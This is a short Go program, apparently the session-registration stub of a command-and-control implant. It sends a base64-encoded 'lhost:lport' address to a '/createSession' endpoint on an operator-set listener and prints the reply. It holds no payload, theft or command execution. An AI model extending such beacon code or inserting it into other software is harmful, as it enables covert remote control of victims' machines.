package main

import (
	"net/http"
	b64 "encoding/base64"
	"net/url"
	"io"
	"fmt"
)

var lhost = ""
var lport = ""

func main() {
	serverAddr := lhost + ":" + lport
	sessionID := b64.StdEncoding.EncodeToString([]byte(serverAddr))

	resp, err := http.PostForm("http://" + serverAddr + "/createSession", url.Values{"sid": {sessionID}})
	if err != nil {
		fmt.Println(err)
	}
	body, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	fmt.Printf("%s\n", body)
}